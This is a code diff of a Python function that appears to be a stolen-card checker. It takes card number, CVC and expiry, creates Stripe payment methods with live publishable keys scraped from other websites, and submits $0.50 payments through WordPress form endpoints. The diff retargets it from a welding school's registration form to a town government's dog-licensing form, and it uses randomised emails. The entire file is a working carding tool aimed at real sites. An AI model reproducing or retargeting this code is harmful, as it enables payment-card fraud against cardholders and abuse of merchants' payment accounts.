@@ -30,42 +30,27 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F58c31ec645%3B+stripe-js-v3%2F58c31ec645%3B+card-element&referrer=https%3A%2F%2Fmissouriweldinginstitute.com&time_on_page=100819&client_attribution_metadata[client_session_id]=ace75521-8b6d-4f44-971d-ee3d12e4415c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=1d2b3fb1-a6a0-4938-8a59-86d4b74c6e28&key=pk_live_51FF13SGQCUXegXqO948S1EBdRmGXkJR2BkvmUgFMxwWCKiEtB4s6Ebj21dUkmGWjgFyy6htDWcFmCOBEk8kbIFz400KaPxqwAL'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F0048eda7be%3B+stripe-js-v3%2F0048eda7be%3B+card-element&referrer=https%3A%2F%2Fcraftsbury.gov&time_on_page=91886&client_attribution_metadata[client_session_id]=a8384fc2-6468-42c7-bacb-4efb4683a872&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=64afbf5b-c8e8-4edc-b8c6-4992363eb787&key=pk_live_51KRTq1BT57e58NfuheCTmAYVSOZxx7Xds4bsv7SqOpIp5zwo8aGLRVrG1V9nfgkoveFkelUbnsX71Kr8QuJGxOdY009WSgHBK5'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	cookies = {
-	    '__cf_bm': 'SHKV3kH.O94i2hP8.3Rzgb4zx.4pUvA3oA8n_Bdfe0w-1776547064.0261467-1.0.1.1-s6JHbgBM_7dUVYSEpSPI_e_Q5RgVK4G.wquSgkv3O1txfstmo4QLodkmb5ExN94n8UoKTg7l80DHlJsk1KCSo1Au2jtgeW8r_.2_U7OfRK0M8SmYD0SOC6yQNmezMeLx',
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_first_add': 'fd%3D2026-04-18%2021%3A17%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-	    '_ga': 'GA1.1.989745671.1776547067',
-	    '_tt_enable_cookie': '1',
-	    '_ttp': '01KPH79XX093D0FWBH87CCZE44_.tt.1',
-	    'cookieyes-consent': 'consentid:Rmljdlh3cndCUkRVV0xNN1NVdmEwbUZ6QXlUaUNDZlA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
-	    '__stripe_mid': '4e6384fb-31d9-4633-bed3-1c3b561dce4b91ad88',
-	    '__stripe_sid': 'ed7046e8-a6f1-4340-8fc5-3db2c6d8de3a1c1ecd',
-	    'sbjs_current_add': 'fd%3D2026-04-18%2021%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F',
-	    'ttcsid_D34TFH3C77U4SLSELMV0': '1776547067826::jEY-y5ff_fxzKgX6D29m.1.1776547225912.1',
-	    'ttcsid': '1776547067829::wsN4TRqvn7XyG79gmNzV.1.1776547225913.0::1.56546.58684::158090.32.359.1799::146738.54.1316',
-	    '_ga_B546DCHQPE': 'GS2.1.s1776547066$o1$g1$t1776547225$j60$l0$h0',
-	    '_gcl_au': '1.1.1920938075.1776547067.1328555406.1776547226.1776547226',
-	    '_ga_5F62Q797TY': 'GS2.1.s1776547067$o1$g1$t1776547226$j60$l0$h2058526088',
+	    '_ga_NKXGBC2W51': 'GS2.1.s1776757519$o1$g0$t1776757519$j60$l0$h0',
+	    '_ga': 'GA1.1.2045814775.1776757520',
+	    '__stripe_mid': 'dd208a86-6460-406e-995e-8c1041c087cb8093ca',
+	    '__stripe_sid': '23d45e55-43b9-49f7-8c9c-ec50010cb0119c440f',
 	}
 	
 	headers = {
-	    'authority': 'missouriweldinginstitute.com',
+	    'authority': 'craftsbury.gov',
 	    'accept': '*/*',
 	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__cf_bm=SHKV3kH.O94i2hP8.3Rzgb4zx.4pUvA3oA8n_Bdfe0w-1776547064.0261467-1.0.1.1-s6JHbgBM_7dUVYSEpSPI_e_Q5RgVK4G.wquSgkv3O1txfstmo4QLodkmb5ExN94n8UoKTg7l80DHlJsk1KCSo1Au2jtgeW8r_.2_U7OfRK0M8SmYD0SOC6yQNmezMeLx; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-04-18%2021%3A17%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.989745671.1776547067; _tt_enable_cookie=1; _ttp=01KPH79XX093D0FWBH87CCZE44_.tt.1; cookieyes-consent=consentid:Rmljdlh3cndCUkRVV0xNN1NVdmEwbUZ6QXlUaUNDZlA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; __stripe_mid=4e6384fb-31d9-4633-bed3-1c3b561dce4b91ad88; __stripe_sid=ed7046e8-a6f1-4340-8fc5-3db2c6d8de3a1c1ecd; sbjs_current_add=fd%3D2026-04-18%2021%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmissouriweldinginstitute.com%2Ftest%2F; ttcsid_D34TFH3C77U4SLSELMV0=1776547067826::jEY-y5ff_fxzKgX6D29m.1.1776547225912.1; ttcsid=1776547067829::wsN4TRqvn7XyG79gmNzV.1.1776547225913.0::1.56546.58684::158090.32.359.1799::146738.54.1316; _ga_B546DCHQPE=GS2.1.s1776547066$o1$g1$t1776547225$j60$l0$h0; _gcl_au=1.1.1920938075.1776547067.1328555406.1776547226.1776547226; _ga_5F62Q797TY=GS2.1.s1776547067$o1$g1$t1776547226$j60$l0$h2058526088',
-	    'origin': 'https://missouriweldinginstitute.com',
-	    'referer': 'https://missouriweldinginstitute.com/test/',
+	    # 'cookie': '_ga_NKXGBC2W51=GS2.1.s1776757519$o1$g0$t1776757519$j60$l0$h0; _ga=GA1.1.2045814775.1776757520; __stripe_mid=dd208a86-6460-406e-995e-8c1041c087cb8093ca; __stripe_sid=23d45e55-43b9-49f7-8c9c-ec50010cb0119c440f',
+	    'origin': 'https://craftsbury.gov',
+	    'referer': 'https://craftsbury.gov/departments/dog-licensing/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -77,17 +62,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1776547226788',
+	    't': '1776757612739',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=4777&_fluentform_8_fluentformnonce=f7f8954bd5&_wp_http_referer=%2Ftest%2F&user_type=teacher&student_phone=%2B66817480690&teacher_name%5Bfirst_name%5D=John&teacher_name%5Blast_name%5D=Nina&teacher_phone=%2B14303000850&teacher_email=yellhtetgaung210618%40gmail.com&number_of_students=1&student_name_1%5Bfirst_name_1%5D=Lack&student_name_1%5Blast_name_1%5D=Bok&student_grade_1=12&student_welding_hours_1=High%20School&registration_fee=0.5&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'data': f'__fluent_form_embded_post_id=12084&_fluentform_10_fluentformnonce=e9c11cb86c&_wp_http_referer=%2Fdepartments%2Fdog-licensing%2F&names_1%5Bfirst_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&phone=%2B66817480630&email=yellhtetgaung2106{random2}%40gmail.com&names%5Bfirst_name%5D=&input_text_1=&input_text_2=&input_text_3=&input_text_4=&dropdown=&input_radio_1=yes&input_radio=Yes%20-%20%2411&checkbox%5B%5D=By%20checking%20this%20box%2C%20I%20am%20agreeing%20that%20this%20is%20considered%20my%20signature.%20I%20certify%20that%20I%20am%20the%20owner%20of%20the%20dog%20described%20above%20and%20that%20all%20information%20provided%20is%20true%20and%20accurate.%20I%20agree%20that%20this%20electronic%20signature%20has%20the%20same%20legal%20validity%20and%20meaning%20as%20my%20handwritten%20signature%20on%20a%20paper%20document.&custom-payment-amount=0.5&payment_method=stripe&input_radio_5=&input_radio_4=&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '8',
+	    'form_id': '10',
 	}
 	
 	response = requests.post(
-	    'https://missouriweldinginstitute.com/wp-admin/admin-ajax.php',
+	    'https://craftsbury.gov/wp-admin/admin-ajax.php',
 	    params=params,
 	    #cookies=cookies,
 	    headers=headers,
